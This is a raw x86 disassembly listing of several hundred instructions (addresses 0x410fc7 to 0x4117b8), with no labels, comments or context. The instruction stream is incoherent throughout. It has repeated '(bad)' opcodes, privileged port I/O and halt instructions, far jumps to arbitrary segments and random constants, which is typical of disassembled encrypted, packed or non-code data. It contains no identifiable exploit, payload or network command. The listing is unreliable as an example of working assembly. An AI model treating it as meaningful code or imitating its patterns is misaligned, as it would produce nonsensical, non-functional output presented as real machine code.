  410fc7:	imul   esi,DWORD PTR [ecx+0x7c7f390c],0x7d415506
  410fd1:	inc    edx
  410fd2:	imul   DWORD PTR [ecx]
  410fd4:	mov    cl,0xa6
  410fd6:	pop    esp
  410fd7:	xor    DWORD PTR [ebx-0x2362184d],0x22
  410fde:	ins    DWORD PTR es:[edi],dx
  410fdf:	inc    edi
  410fe0:	fadd   DWORD PTR [esi]
  410fe2:	xor    DWORD PTR [eax],esp
  410fe4:	jne    0xa5a947a6
  410fea:	retf   0x584d
  410fed:	jmp    0x7066:0xbecad881
  410ff4:	out    dx,eax
  410ff5:	jmp    0xbe9caf02
  410ffa:	pushf  
  410ffb:	and    eax,DWORD PTR [edx]
  410ffd:	aad    0xbb
  410fff:	es stos DWORD PTR es:[edi],eax
  411001:	cli    
  411002:	imul   ebp,DWORD PTR [ebx-0x56c041bf],0x7ecdffc2
  41100c:	jnp    0x41100b
  41100e:	cmp    eax,0x2c4a1dc0
  411013:	push   ecx
  411014:	cli    
  411015:	(bad)  
  411017:	add    eax,ebx
  411019:	adc    eax,0xab6f7142
  41101e:	les    edx,FWORD PTR [esi+0x85ab9b1]
  411024:	mov    eax,DWORD PTR [esi]
  411026:	xchg   esp,eax
  411027:	add    eax,0xefc2cb4
  41102c:	clc    
  41102d:	stc    
  41102e:	mov    edx,edi
  411030:	adc    eax,0x4826be01
  411035:	sub    ch,dl
  411037:	mov    eax,0x6303a0e6
  41103c:	push   edx
  41103d:	addr16 in al,dx
  41103f:	jge    0x41103b
  411041:	or     al,0x9f
  411043:	stos   DWORD PTR es:[edi],eax
  411044:	sub    eax,0x94d708e0
  411049:	aas    
  41104a:	jo     0x410ffc
  41104c:	sbb    esp,0x62
  41104f:	fnstenv [ebp+0x642ac4cc]
  411055:	pop    ecx
  411056:	ins    BYTE PTR es:[edi],dx
  411057:	mov    ebx,0xfad19cf0
  41105c:	call   DWORD PTR [ebx+edx*1]
  41105f:	adc    al,0x77
  411061:	loop   0x4110d7
  411063:	fwait
  411064:	push   ds
  411065:	sbb    DWORD PTR [edx-0x16bb4402],ecx
  41106b:	pop    ss
  41106c:	adc    BYTE PTR [esp+esi*1-0x170627cb],dh
  411073:	gs add ch,cl
  411076:	arpl   WORD PTR [esi-0x60],cx
  411079:	test   ebp,ebx
  41107b:	cwde   
  41107c:	cmp    BYTE PTR [ebx],al
  41107e:	hlt    
  41107f:	mov    edx,0x3fe89e48
  411084:	push   0xffffffcb
  411086:	iret   
  411087:	pop    ds
  411088:	push   0x88cf98ff
  41108d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41108e:	mov    edi,0x70f1f85a
  411093:	test   DWORD PTR [edx-0x7c],eax
  411096:	mov    al,ds:0x4eb85946
  41109b:	cdq    
  41109c:	dec    eax
  41109d:	in     eax,0x73
  41109f:	and    eax,0xf06290c5
  4110a4:	dec    ebx
  4110a5:	inc    edx
  4110a6:	outs   dx,BYTE PTR ds:[esi]
  4110a7:	push   ecx
  4110a8:	push   ss
  4110a9:	scas   al,BYTE PTR es:[edi]
  4110aa:	jns    0x411076
  4110ac:	pop    edx
  4110ad:	rcl    ebx,0x31
  4110b0:	sbb    esi,DWORD PTR [ebx]
  4110b2:	sbb    ecx,DWORD PTR [esp]
  4110b5:	mov    bh,0x95
  4110b7:	scas   al,BYTE PTR es:[edi]
  4110b8:	ficomp DWORD PTR [eax-0x6]
  4110bb:	scas   al,BYTE PTR es:[edi]
  4110bc:	dec    ebx
  4110bd:	mov    esi,0x7894709b
  4110c2:	mov    eax,ds:0xe31d8173
  4110c7:	mov    ch,0x44
  4110c9:	mov    DWORD PTR ds:0x66b24220,esi
  4110cf:	jbe    0x4110ec
  4110d1:	dec    eax
  4110d2:	pop    esi
  4110d3:	es nop
  4110d5:	(bad)  
  4110d7:	outs   dx,BYTE PTR ds:[esi]
  4110d8:	scas   al,BYTE PTR es:[edi]
  4110d9:	add    BYTE PTR [esi+ebx*2-0x54],0x4
  4110de:	push   es
  4110df:	mov    ebp,0x50c9d9fb
  4110e4:	sub    al,0x82
  4110e6:	mov    dl,0xc
  4110e8:	rcr    esi,0xc6
  4110eb:	xchg   edx,eax
  4110ec:	inc    esi
  4110ed:	jl     0x411087
  4110ef:	sub    edx,edx
  4110f1:	leave  
  4110f2:	mov    ebp,0x632df2b8
  4110f7:	mov    edx,DWORD PTR [eax]
  4110f9:	in     eax,0xb3
  4110fb:	push   cs
  4110fc:	push   0x1d
  4110fe:	pop    ecx
  4110ff:	shr    DWORD PTR [edx],cl
  411101:	bound  ebx,QWORD PTR [edx]
  411103:	mov    bl,0x96
  411105:	shl    DWORD PTR [eax-0x367758cb],cl
  41110b:	jae    0x41118b
  41110d:	(bad)  
  41110e:	out    dx,eax
  41110f:	call   0x475:0x81d32023
  411116:	jns    0x4110b6
  411118:	fidivr DWORD PTR [eax]
  41111b:	ffree  st(7)
  41111d:	fnstenv [esi-0x2d685d3a]
  411123:	jns    0x4110c8
  411125:	sub    edx,DWORD PTR [esi-0x44]
  411128:	bound  eax,QWORD PTR [esi]
  41112a:	ror    DWORD PTR [esi+0x30],0x2d
  41112e:	mov    al,0xc8
  411130:	push   eax
  411131:	xlat   BYTE PTR ds:[ebx]
  411132:	ins    BYTE PTR es:[edi],dx
  411133:	mov    esp,0x5193504c
  411138:	xor    ecx,DWORD PTR [esi+0x30195d1]
  41113e:	std    
  41113f:	dec    ecx
  411140:	add    eax,0xc3d5d044
  411145:	movd   mm1,DWORD PTR [ebx]
  411148:	pop    ds
  411149:	jmp    0x35d66e4e
  41114e:	sbb    esi,DWORD PTR [eax]
  411150:	out    dx,al
  411151:	xchg   ecx,eax
  411152:	mov    bl,0xa7
  411154:	ins    DWORD PTR es:[edi],dx
  411155:	jge    0x411178
  411157:	push   esp
  411158:	int3   
  411159:	mov    ebx,0x7dcab0ee
  41115e:	fs pop edx
  411160:	(bad)  
  411161:	fdivr  QWORD PTR [eax+0x20]
  411164:	leave  
  411165:	xchg   ebx,eax
  411166:	inc    edi
  411167:	ins    BYTE PTR es:[edi],dx
  411168:	icebp  
  411169:	retf   0x99c8
  41116c:	neg    edx
  41116e:	jmp    0x315a:0x97f994b8
  411175:	inc    edx
  411176:	jl     0x411101
  411178:	xlat   BYTE PTR ds:[ebx]
  411179:	mov    esi,ecx
  41117b:	les    esp,FWORD PTR [ebp-0x78ab19a]
  411181:	or     edi,DWORD PTR [eax-0x536f8f38]
  411187:	mov    al,0x14
  411189:	cmp    BYTE PTR [edx-0x14],bh
  41118c:	pop    eax
  41118d:	(bad)  
  41118e:	or     DWORD PTR [ebx+0x1b],ecx
  411191:	pop    es
  411192:	mov    al,0x1b
  411194:	xchg   ebp,eax
  411195:	pop    esi
  411196:	mov    ebp,0xa94814f2
  41119b:	aas    
  41119c:	lahf   
  41119d:	(bad)  
  41119e:	fbld   TBYTE PTR [ebx]
  4111a0:	inc    ebp
  4111a1:	outs   dx,BYTE PTR ds:[esi]
  4111a2:	pop    edi
  4111a3:	outs   dx,BYTE PTR ds:[esi]
  4111a4:	lods   al,BYTE PTR ds:[esi]
  4111a5:	pop    ebx
  4111a6:	repnz dec ecx
  4111a8:	fst    QWORD PTR [ebx]
  4111ab:	in     eax,dx
  4111ac:	cwde   
  4111ad:	sbb    bh,BYTE PTR [ebx+0x24f22240]
  4111b3:	pusha  
  4111b4:	adc    al,0xc6
  4111b6:	ja     0x4111c7
  4111b8:	test   eax,0x78560dc7
  4111bd:	stos   BYTE PTR es:[edi],al
  4111be:	xor    DWORD PTR [esi],eax
  4111c0:	sbb    BYTE PTR [ecx+0x68],al
  4111c3:	in     eax,0x6d
  4111c5:	out    dx,al
  4111c6:	mov    esp,0x44ff5361
  4111cb:	repnz jmp 0x6df8:0x71e6dbbd
  4111d3:	lock popa 
  4111d5:	adc    al,0xe3
  4111d7:	ret    0x5f2
  4111da:	mov    esp,0xd7bffc9b
  4111df:	out    0xdb,eax
  4111e1:	mov    al,0xf8
  4111e3:	mov    ebx,0x11b7ae25
  4111e8:	inc    esi
  4111e9:	mov    al,ds:0x2c8c4ad0
  4111ee:	jb     0x4111a6
  4111f0:	mov    dx,0x81ff
  4111f4:	jge    0x41118a
  4111f6:	repz adc BYTE PTR [ebx+0x333dbe1b],cl
  4111fd:	in     al,dx
  4111fe:	sub    esp,DWORD PTR [ebx+0x4d4c79ce]
  411204:	mov    DWORD PTR [esi-0x75ff84b],eax
  41120a:	rcr    DWORD PTR [eax],cl
  41120c:	inc    eax
  41120d:	pop    ebp
  41120e:	xchg   ebx,eax
  41120f:	xchg   al,ah
  411211:	adc    DWORD PTR [edi+0x58],edi
  411214:	cld    
  411215:	dec    ebx
  411216:	in     eax,0x8f
  411218:	ret    
  411219:	and    eax,0x3ffce570
  41121e:	scas   al,BYTE PTR es:[edi]
  41121f:	rol    DWORD PTR [esi-0x73],0xad
  411223:	popf   
  411224:	pushf  
  411225:	or     DWORD PTR [edx],edi
  411227:	xor    al,0x6
  411229:	subps  xmm1,XMMWORD PTR [esi-0x1ff2ec7f]
  411230:	jne    0x411247
  411232:	jg     0x411283
  411234:	xchg   ecx,eax
  411235:	dec    esi
  411236:	sbb    ah,ah
  411238:	cld    
  411239:	call   0x3f84a44f
  41123e:	sbb    BYTE PTR [bp-0x2c],bl
  411242:	call   0x9857:0x3daf31c9
  411249:	hlt    
  41124a:	jg     0x411208
  41124c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41124d:	repnz mov bl,0x75
  411250:	pop    edi
  411251:	les    ebx,FWORD PTR [ebp+0x32]
  411254:	dec    ecx
  411255:	ja     0x411240
  411257:	jbe    0x41121c
  411259:	jno    0x41125a
  41125b:	inc    eax
  41125c:	or     dh,BYTE PTR ds:0x5a07bd75
  411262:	aad    0xf3
  411264:	aas    
  411265:	dec    edi
  411266:	enter  0xefa6,0xee
  41126a:	push   eax
  41126b:	mov    esp,0x871ea8a4
  411270:	adc    BYTE PTR [edx],cl
  411272:	ds ret 
  411274:	(bad)
  411277:	inc    ecx
  411278:	je     0x411298
  41127a:	leave  
  41127b:	jg     0x41127d
  41127d:	xchg   BYTE PTR [eax+edi*2+0x6a],dh
  411281:	jge    0x411216
  411283:	fcomp  QWORD PTR [edx]
  411285:	cmp    cl,BYTE PTR [ebx]
  411287:	pushf  
  411288:	adc    BYTE PTR [esi+0x30b6d30e],ch
  41128e:	xchg   BYTE PTR [edx-0x68e297d2],dh
  411294:	nop
  411295:	jecxz  0x4112af
  411297:	sbb    edi,DWORD PTR [ebp+0x36]
  41129a:	push   ds
  41129b:	sub    eax,0x5375de5a
  4112a0:	cld    
  4112a1:	cmp    DWORD PTR ds:[eax],0x36c3636a
  4112a8:	pop    esi
  4112a9:	add    al,0xb9
  4112ab:	mov    ch,0x6b
  4112ad:	xor    al,0x92
  4112af:	minps  xmm4,XMMWORD PTR [eax]
  4112b2:	lods   eax,DWORD PTR ds:[esi]
  4112b3:	mov    ch,0x97
  4112b5:	lock pusha 
  4112b7:	pop    ebx
  4112b8:	shl    BYTE PTR [ebp-0x3a0b50b0],0x7b
  4112bf:	ds cdq 
  4112c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112c2:	push   ss
  4112c3:	sar    esp,0xd3
  4112c6:	or     al,0x63
  4112c8:	fimul  DWORD PTR [edi]
  4112ca:	ins    BYTE PTR es:[edi],dx
  4112cb:	add    DWORD PTR [ebp-0x4d2811a2],esi
  4112d1:	(bad)  
  4112d2:	aam    0xad
  4112d4:	jmp    0xd5e4:0xa2fef874
  4112db:	push   es
  4112dc:	cld    
  4112dd:	repz test eax,0x3ce852bb
  4112e3:	mov    dl,0x5d
  4112e5:	imul   edx,DWORD PTR [ebx],0xcc1be3b2
  4112eb:	pusha  
  4112ec:	repnz test BYTE PTR [ecx+0x35b83f0f],ah
  4112f3:	outs   dx,BYTE PTR ds:[esi]
  4112f4:	or     al,0xb7
  4112f6:	out    dx,al
  4112f7:	jnp    0x41134a
  4112f9:	mov    ch,0xa
  4112fb:	cmp    eax,0x5b93d7f3
  411300:	clc    
  411301:	call   0x3308:0x10c23fc3
  411308:	push   eax
  411309:	or     ax,0xbb3c
  41130d:	in     eax,dx
  41130e:	sub    eax,esp
  411310:	std    
  411311:	not    ecx
  411313:	retf   
  411314:	push   es
  411315:	xchg   esp,eax
  411316:	mov    bh,0x33
  411318:	je     0x411354
  41131a:	or     ebx,DWORD PTR [edi-0x506eac7]
  411320:	out    0x8,eax
  411322:	mov    esp,0x10c6ce6c
  411327:	mov    esi,0x9b90c14e
  41132c:	mov    DWORD PTR [esi-0x2884168],0x8266c37a
  411336:	push   ecx
  411337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411338:	add    dh,al
  41133a:	mov    bl,0x81
  41133c:	stos   BYTE PTR es:[edi],al
  41133d:	nop
  41133e:	mov    WORD PTR [edx-0x18],ds
  411341:	sub    al,ch
  411343:	adc    ebx,DWORD PTR [edi-0x2380d639]
  411349:	js     0x411341
  41134b:	loop   0x4112eb
  41134d:	lock jns 0x411333
  411350:	dec    edx
  411351:	sbb    esi,DWORD PTR [esi]
  411353:	into   
  411354:	pop    ecx
  411355:	pop    ds
  411356:	xor    DWORD PTR [esi+edi*8+0x7a],edx
  41135a:	and    eax,0x84c09383
  41135f:	ror    BYTE PTR [ebx-0x14],0x44
  411363:	je     0x411334
  411365:	mov    ah,0xa7
  411367:	fisubr DWORD PTR [edx]
  411369:	mov    ecx,0x4a30240f
  41136e:	call   0x49057d51
  411373:	lods   eax,DWORD PTR ds:[esi]
  411374:	fcmovbe st,st(2)
  411376:	dec    esi
  411377:	retf   0x21be
  41137a:	or     esi,eax
  41137c:	ins    BYTE PTR es:[edi],dx
  41137d:	(bad)  
  41137e:	xchg   edx,eax
  41137f:	sbb    DWORD PTR [esi+0x4c6f1794],eax
  411385:	test   BYTE PTR [edi+0x64b784d9],0x4e
  41138c:	jne    0x411379
  41138e:	stc    
  41138f:	dec    esi
  411390:	fimul  DWORD PTR [edx+ebx*1-0x6030d8d6]
  411397:	inc    ebp
  411398:	shr    DWORD PTR [esi+0x19],cl
  41139b:	(bad)  
  41139c:	iret   
  41139d:	aaa    
  41139e:	scas   eax,DWORD PTR es:[edi]
  41139f:	ss sahf 
  4113a1:	cmp    bl,BYTE PTR [edi-0x6]
  4113a4:	test   al,al
  4113a6:	test   bl,0xa2
  4113a9:	and    BYTE PTR [ecx-0x5a],ch
  4113ac:	pop    ebp
  4113ad:	and    eax,0xa2a49971
  4113b2:	pop    edx
  4113b3:	sub    DWORD PTR [ebx-0xcf9717],esp
  4113b9:	sti    
  4113ba:	jge    0x41142c
  4113bc:	adc    ecx,DWORD PTR [esi-0x2f]
  4113bf:	aam    0x31
  4113c1:	aad    0x5
  4113c3:	push   eax
  4113c4:	int    0x16
  4113c6:	cdq    
  4113c7:	bound  eax,QWORD PTR [edx-0x76]
  4113ca:	push   ebp
  4113cb:	adc    BYTE PTR [edx],cl
  4113cd:	jae    0x4113f0
  4113cf:	icebp  
  4113d0:	jns    0x411423
  4113d2:	sub    al,BYTE PTR [edx+0x43cbd951]
  4113d8:	fucom  st(2)
  4113da:	cmp    DWORD PTR [eax],ebx
  4113dc:	das    
  4113dd:	pop    ebx
  4113de:	loope  0x4113f5
  4113e0:	jns    0x4113a0
  4113e2:	test   BYTE PTR [ecx],dh
  4113e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113e5:	mov    bh,0x62
  4113e7:	popw   es
  4113e9:	std    
  4113ea:	pop    ebx
  4113eb:	mov    al,ds:0x55bf5793
  4113f0:	aas    
  4113f1:	pop    ds
  4113f2:	jb     0x41141c
  4113f4:	ds xchg ebx,eax
  4113f6:	cmp    edx,DWORD PTR [edi-0x325475b3]
  4113fc:	mov    esp,0xb5362bb5
  411401:	icebp  
  411402:	pop    edi
  411403:	mov    ah,0x89
  411405:	dec    esi
  411406:	adc    eax,0x78a7cd09
  41140b:	ins    BYTE PTR es:[edi],dx
  41140c:	arpl   WORD PTR ds:0x39b9d7bc,cx
  411412:	out    dx,eax
  411413:	xchg   edi,eax
  411414:	cs jo  0x411401
  411417:	outs   dx,BYTE PTR ds:[esi]
  411418:	xor    eax,0x506e25ad
  41141d:	jnp    0x411401
  41141f:	mulps  xmm7,XMMWORD PTR [edx+0x40f67257]
  411426:	push   ecx
  411427:	pop    edi
  411428:	pop    ecx
  411429:	ins    DWORD PTR es:[edi],dx
  41142a:	xchg   esi,eax
  41142b:	adc    dl,BYTE PTR [esi+0x4e]
  41142e:	mov    edi,0xba631
  411433:	and    esp,DWORD PTR [edx+ebx*2-0x5a]
  411437:	push   ebp
  411438:	xchg   esi,eax
  411439:	add    esp,DWORD PTR [edx+0x3f]
  41143c:	adc    al,0xa0
  41143e:	in     eax,dx
  41143f:	mov    BYTE PTR [ecx+0x23],0xef
  411443:	gs push ecx
  411445:	je     0x41142f
  411447:	push   es
  411448:	mov    esi,0xe0393181
  41144d:	(bad)  
  41144e:	lods   eax,DWORD PTR ds:[esi]
  41144f:	jnp    0x4113fa
  411451:	fsubr  DWORD PTR [ebx+0x5a388f90]
  411457:	dec    esi
  411458:	mov    BYTE PTR [edx],al
  41145a:	clc    
  41145b:	pop    eax
  41145c:	mov    ch,0xc5
  41145e:	sbb    ah,dl
  411460:	cld    
  411461:	add    al,0x59
  411463:	and    BYTE PTR [ebx-0x41],0x6a
  411467:	std    
  411468:	aas    
  411469:	and    DWORD PTR [ebp+0x37],0x8102ca02
  411470:	(bad)  
  411471:	icebp  
  411472:	pop    es
  411473:	xchg   edx,eax
  411474:	popf   
  411475:	xchg   esp,eax
  411476:	ror    DWORD PTR [ecx+0x65],0x9e
  41147a:	inc    esp
  41147b:	into   
  41147c:	stos   BYTE PTR es:[edi],al
  41147d:	cmp    BYTE PTR [eax+0x454de0f1],cl
  411483:	push   esp
  411484:	dec    esi
  411485:	repz dec edx
  411487:	xchg   esp,eax
  411488:	sbb    edi,DWORD PTR [ebp+0x1b4e5804]
  41148e:	xor    esi,DWORD PTR [edx-0x798cec33]
  411494:	ja     0x411503
  411496:	or     eax,DWORD PTR [ecx]
  411498:	pusha  
  411499:	inc    edx
  41149a:	out    0x73,al
  41149c:	pop    esp
  41149d:	sub    esi,edi
  41149f:	mov    ah,0xcb
  4114a1:	mov    ecx,0x8cc2d570
  4114a6:	push   cs
  4114a7:	ficom  DWORD PTR [ecx+0x7d2a69cf]
  4114ad:	shl    edi,cl
  4114af:	lds    esi,FWORD PTR [eax+0x23ac7cc1]
  4114b5:	push   es
  4114b6:	xor    esp,edi
  4114b8:	inc    ecx
  4114b9:	sub    esp,DWORD PTR [edx]
  4114bb:	pop    esi
  4114bc:	cmp    DWORD PTR [edi-0x23cd3816],0x418b2262
  4114c6:	dec    ebx
  4114c7:	(bad)
  4114ca:	inc    esi
  4114cb:	jo     0x411476
  4114cd:	pop    eax
  4114ce:	jge    0x4114e4
  4114d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d1:	(bad)  
  4114d2:	call   0xed8d3dac
  4114d7:	pop    ss
  4114d8:	das    
  4114d9:	arpl   WORD PTR [esp-0x64],dx
  4114dd:	into   
  4114de:	cmp    eax,0x85942fab
  4114e3:	add    eax,0x18dd0a03
  4114e8:	es loopne 0x411559
  4114eb:	ret    0xec7c
  4114ee:	or     DWORD PTR [edi+0x71],edi
  4114f1:	mov    dh,0x85
  4114f3:	inc    ecx
  4114f4:	xchg   ebx,eax
  4114f5:	mov    ecx,0xbe01b3a3
  4114fa:	xchg   DWORD PTR [edi+0x2a9e52ce],esp
  411500:	stos   BYTE PTR es:[edi],al
  411501:	mov    ebx,0xf4b3934b
  411506:	push   ecx
  411507:	shl    cl,cl
  411509:	mov    ebx,0xb62a4361
  41150e:	pop    ecx
  41150f:	repnz and al,0xc8
  411512:	outs   dx,BYTE PTR ds:[esi]
  411513:	daa    
  411514:	stc    
  411515:	inc    eax
  411516:	mov    edi,DWORD PTR [ebp-0x2fb37dc4]
  41151c:	jno    0x411500
  41151e:	stc    
  41151f:	fld    TBYTE PTR [bx+si]
  411522:	inc    edx
  411523:	popfw  
  411525:	sbb    dh,BYTE PTR [esi+0x6f88d16b]
  41152b:	arpl   WORD PTR [ebx],cx
  41152d:	lock and eax,0xabd0e1d
  411533:	cli    
  411534:	jg     0x411555
  411536:	fwait
  411537:	icebp  
  411538:	mov    eax,DWORD PTR [esi]
  41153a:	mov    ebp,0xaa7ee9de
  41153f:	sub    BYTE PTR [ebx-0x43ae0704],ch
  411545:	jle    0x4115ae
  411547:	mov    al,ds:0x189f696d
  41154c:	sub    al,0x93
  41154e:	aaa    
  41154f:	stos   BYTE PTR es:[edi],al
  411550:	shl    DWORD PTR [edx],cl
  411552:	jmp    0x41154a
  411554:	dec    eax
  411555:	out    0xca,eax
  411557:	inc    esp
  411558:	pop    esp
  411559:	push   ecx
  41155a:	shl    DWORD PTR ds:0x77f7f796,0xc0
  411561:	test   edx,edx
  411563:	mov    BYTE PTR [ebp+0x37],bh
  411566:	adc    BYTE PTR [ebx],dl
  411568:	enter  0xc1d8,0x28
  41156c:	daa    
  41156d:	cmp    cl,dl
  41156f:	retf   0xc7a5
  411572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411573:	or     edx,DWORD PTR [eax]
  411575:	outs   dx,BYTE PTR ss:[esi]
  411577:	out    0x2d,al
  411579:	or     al,0x3f
  41157b:	add    al,0x9a
  41157d:	mov    ebx,0x91de092e
  411582:	push   0x6d79bf76
  411587:	out    dx,eax
  411588:	inc    eax
  411589:	jecxz  0x41159d
  41158b:	pop    esp
  41158c:	add    eax,0x96bae79d
  411591:	in     al,0x6a
  411593:	mov    bh,0x64
  411595:	fadd   DWORD PTR [ecx-0x2b]
  411598:	das    
  411599:	call   0x6981:0x2f7c89f3
  4115a0:	in     eax,dx
  4115a1:	ret    
  4115a2:	jne    0x4115dd
  4115a4:	frstor [eax-0x698c8dca]
  4115aa:	mov    gs,WORD PTR [eax+ebx*4+0x10]
  4115ae:	imul   esi,DWORD PTR [esi+edx*4+0x7b36c678]
  4115b6:	out    0xae,al
  4115b8:	adc    bh,BYTE PTR [ebp-0x2ce75b4d]
  4115be:	sbb    al,0x4
  4115c0:	mov    ah,0x64
  4115c2:	xor    ch,BYTE PTR [eax-0x59]
  4115c5:	popa   
  4115c6:	inc    edx
  4115c7:	sahf   
  4115c8:	(bad)  
  4115c9:	fld    QWORD PTR [ebx+0x5492e57f]
  4115cf:	loopne 0x41158b
  4115d1:	out    0x96,eax
  4115d3:	enter  0x56b9,0xe0
  4115d7:	pop    ebp
  4115d8:	dec    edx
  4115d9:	cmp    eax,0xc4ca1b51
  4115de:	inc    esp
  4115df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e0:	sub    al,dh
  4115e2:	test   eax,0x1320c25c
  4115e7:	cmp    BYTE PTR [edx+0x76],cl
  4115ea:	(bad)  
  4115eb:	imul   esi,DWORD PTR [edi-0x6049f7cf],0xffffffe7
  4115f2:	push   cs
  4115f3:	iret   
  4115f4:	jnp    0x41157d
  4115f6:	mov    ebx,0xf4984020
  4115fb:	xor    edi,DWORD PTR [edi-0x7727029]
  411601:	adc    BYTE PTR [esi+0x79],cl
  411604:	mov    dl,BYTE PTR ds:0xf11298f2
  41160a:	test   edi,edi
  41160c:	int    0xe1
  41160e:	pop    ebx
  41160f:	test   BYTE PTR [esi+0x0],bl
  411612:	jg     0x41166f
  411614:	outs   dx,BYTE PTR ds:[esi]
  411615:	xchg   ebx,eax
  411616:	int3   
  411617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411618:	mov    bl,0x74
  41161a:	std    
  41161b:	daa    
  41161c:	cld    
  41161d:	stos   BYTE PTR es:[edi],al
  41161e:	jno    0x4115b1
  411620:	adc    al,BYTE PTR [edi-0x42]
  411623:	mov    al,ds:0xdcf42ac5
  411628:	jbe    0x4115f8
  41162a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41162b:	jmp    0xe8e6a212
  411630:	je     0x411655
  411632:	sbb    edx,ebx
  411634:	iret   
  411635:	ja     0x411659
  411637:	mov    esp,0xe30c5be
  41163c:	(bad)  
  41163d:	mov    edx,0x403262cd
  411642:	pop    ds
  411643:	mov    eax,0xbae3d095
  411648:	outs   dx,DWORD PTR ds:[esi]
  411649:	push   cs
  41164a:	xchg   ebp,eax
  41164b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41164c:	push   ds
  41164d:	cmp    eax,0x2eb025d4
  411652:	ins    BYTE PTR es:[edi],dx
  411653:	sahf   
  411654:	ret    
  411655:	pop    es
  411656:	ja     0x4116ac
  411658:	xchg   ebp,eax
  411659:	test   DWORD PTR [ebx+0x340c2dd3],esi
  41165f:	addr16 jmp 0x9aa6ed7f
  411665:	xchg   ecx,eax
  411666:	and    DWORD PTR [eax+0x11e5c168],0xffffff96
  41166d:	test   eax,0x1c069cc
  411672:	lods   eax,DWORD PTR ds:[esi]
  411673:	int    0xd5
  411675:	in     al,0xdf
  411677:	cmp    DWORD PTR [edx+0x3f1fd505],0x5d7aa622
  411681:	sub    bl,BYTE PTR [ebx]
  411683:	lea    ebx,[eax]
  411685:	mov    bh,0xe4
  411687:	in     eax,dx
  411688:	sahf   
  411689:	call   0x1facccbe
  41168e:	jno    0x4116d4
  411690:	pop    ss
  411691:	or     al,0x98
  411693:	sub    BYTE PTR [edi*4+0xf447ec],bh
  41169a:	stc    
  41169b:	mov    ecx,0xb1d36eb4
  4116a0:	jmp    0x41171f
  4116a2:	sbb    bl,BYTE PTR [edi+0x1015c8cc]
  4116a8:	dec    edx
  4116a9:	add    al,0x5f
  4116ab:	fldenv [edx-0x34dfd02]
  4116b1:	jo     0x4116ca
  4116b3:	loop   0x4116c5
  4116b5:	sbb    al,0x4c
  4116b7:	jnp    0x41165e
  4116b9:	mov    esp,eax
  4116bb:	sub    al,0xb2
  4116bd:	test   BYTE PTR [esi+0x2d],bl
  4116c0:	mov    ds:0x32118975,al
  4116c5:	into   
  4116c6:	xor    BYTE PTR [esi+edi*2-0x21],al
  4116ca:	retf   
  4116cb:	stos   DWORD PTR es:[edi],eax
  4116cc:	sbb    DWORD PTR [ecx],edi
  4116ce:	xor    BYTE PTR [ebp+edi*8-0x47281fa4],dh
  4116d5:	pop    ss
  4116d6:	iret   
  4116d7:	jecxz  0x411744
  4116d9:	sbb    BYTE PTR ds:0xaf2b207e,ch
  4116df:	retf   
  4116e0:	push   ebx
  4116e1:	out    0xc3,al
  4116e3:	cwde   
  4116e4:	lea    ebx,[eax+0x34]
  4116e7:	lods   eax,DWORD PTR ds:[esi]
  4116e8:	cdq    
  4116e9:	arpl   bp,ax
  4116eb:	jne    0x4116de
  4116ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ee:	push   ebp
  4116ef:	rcr    ebx,0x2b
  4116f2:	add    BYTE PTR [ebx],ch
  4116f4:	aaa    
  4116f5:	mov    bh,0xd8
  4116f7:	xor    bh,BYTE PTR [edx]
  4116f9:	mov    WORD PTR [esi],fs
  4116fb:	push   0x76e8cc44
  411700:	cmp    edi,DWORD PTR [esi]
  411702:	jo     0x41171a
  411704:	cmp    ebp,DWORD PTR [ecx-0x37886a7d]
  41170a:	fwait
  41170b:	mul    BYTE PTR [ebp-0x44]
  41170e:	mov    bl,bh
  411710:	in     al,dx
  411711:	enter  0xd5ad,0x82
  411715:	dec    BYTE PTR [edx+0x22]
  411718:	gs (bad) 
  41171a:	idiv   BYTE PTR [edx-0x55a45a16]
  411720:	mov    ebx,DWORD PTR [edi-0x22c9429e]
  411726:	xor    al,0x28
  411728:	adc    al,0xd5
  41172a:	fcomi  st,st(1)
  41172c:	push   es
  41172d:	or     al,0x9a
  41172f:	std    
  411730:	push   edi
  411731:	ss dec ecx
  411733:	or     eax,ebx
  411735:	push   eax
  411736:	adc    al,0x1f
  411738:	jbe    0x411794
  41173a:	mov    ebx,0xa2539711
  41173f:	out    0x51,eax
  411741:	popa   
  411742:	fld    DWORD PTR [esi+eiz*4-0x41603db4]
  411749:	mov    bl,0x65
  41174b:	push   ecx
  41174c:	stos   DWORD PTR es:[edi],eax
  41174d:	fdiv   DWORD PTR [edi+esi*1]
  411750:	inc    ebx
  411751:	jne    0x411746
  411753:	cmp    eax,0x2b3f9599
  411758:	inc    edx
  411759:	out    0x68,eax
  41175b:	mov    ch,0xc4
  41175d:	adc    edx,DWORD PTR [eax]
  41175f:	xchg   ebp,eax
  411760:	daa    
  411761:	xchg   DWORD PTR [ebp-0x2c],eax
  411764:	and    esi,edi
  411766:	bound  ecx,QWORD PTR ds:0x73787a8d
  41176c:	mov    BYTE PTR [ebx-0x1c13ddd9],bh
  411772:	(bad)  
  411773:	jmp    0xa886:0x1f8e307a
  41177a:	or     esi,DWORD PTR [edi-0x20]
  41177d:	xor    eax,0x3449eabe
  411782:	scas   al,BYTE PTR es:[edi]
  411783:	add    al,0x90
  411785:	mov    eax,ds:0x3c25df9b
  41178a:	sub    DWORD PTR [ecx+0x71038620],0xffffffd9
  411791:	add    bl,BYTE PTR [esi]
  411793:	adc    al,0x67
  411795:	xor    dl,BYTE PTR [edi-0x3045d2ad]
  41179b:	test   al,0xe5
  41179d:	sbb    DWORD PTR [edi+0x5b74385],ebp
  4117a3:	arpl   WORD PTR [ebp+0x7],ax
  4117a6:	mov    ds:0x9f3ced0a,al
  4117ab:	retf   
  4117ac:	ror    BYTE PTR [ecx+0x3d],cl
  4117af:	pop    ss
  4117b0:	sbb    eax,0xd9b6a377
  4117b5:	(bad)  
  4117b6:	out    0x94,eax
  4117b8:	sub    al,dh
